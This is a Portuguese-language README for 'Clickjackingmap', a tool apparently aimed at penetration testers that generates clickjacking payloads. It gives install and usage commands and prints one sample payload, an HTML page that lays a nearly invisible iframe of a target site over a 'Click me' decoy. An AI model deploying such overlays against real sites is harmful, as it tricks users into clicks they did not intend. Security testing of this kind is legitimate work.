<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>

[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=Clickjackingmap)](https://git.io/typing-svg)



<h4 align="center"> Tool to generate payloads focused on clickjacking </h4>


<p align="center">
  <a href="#características">Features</a> •
  <a href="#instalação">Install</a> •
  <a href="#forma-de-utilização">How to use</a> •
  <a href="#executando-revshell">Usage</a>
</p>

---


O Clickjackingmap é uma ferramenta que gera payloads de Clickjacking. Possui uma funcionalidade que gera diversas possibilidades de exploração.

Projetei o `Clickjackingmap`  e mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.

# Características

 - Gera payloads clickjacking com foco em exploração de induzir um usuário a clicar em algo diferente do que o usuário percebe.

# Forma de utilização

```sh
node ./dist/clickjackingmap.js -u https://teste.com -p clickbasic
```
Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
```yaml

               __ __        __     __              __     __                                   
        .----.|  |__|.----.|  |--.|__|.---.-.----.|  |--.|__|.-----.-----.--------.---.-.-----.
        |  __||  |  ||  __||    < |  ||  _  |  __||    < |  ||     |  _  |        |  _  |  _  |
        |____||__|__||____||__|__||  ||___._|____||__|__||__||__|__|___  |__|__|__|___._|   __|
                                 |___|                             |_____|              |__|
                                                                            Autor: joaovictorti
                                                                            version: 1.1   

usage: clickjackingmap.js [-h] -u URL -p {clickbasic,clickmulti}

Clickjackingmap

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Insert url
  -p {clickbasic,clickmulti}, --payload {clickbasic,clickmulti}
                        Insert Payload
```

# Instalação

Clickjackingmap requer **Typerscript e o Node** e para baixá-lo só usar:

```sh
git clone https://github.com/joaoviictorti/clickjackingmap
```

# Executando Clickjackingmap

```console
node .\dist\clickjackingmap.js -u https://teste.com -p clickbasic

               __ __        __     __              __     __                                   
        .----.|  |__|.----.|  |--.|__|.---.-.----.|  |--.|__|.-----.-----.--------.---.-.-----.
        |  __||  |  ||  __||    < |  ||  _  |  __||    < |  ||     |  _  |        |  _  |  _  |
        |____||__|__||____||__|__||  ||___._|____||__|__||__||__|__|___  |__|__|__|___._|   __|
                                 |___|                             |_____|              |__|
                                                                            Autor: joaovictorti
                                                                            version: 1.1   
clicjackingbasic.html:

<style>
    iframe{
        position: relative;
        width: 1000x;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div{
        position: absolute;
        top: 500px;
        left: 60px;
        z-index: 1;
    }
                
</style>
<div>Click me</div>
<iframe src="https://teste.com"></iframe>

```


<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
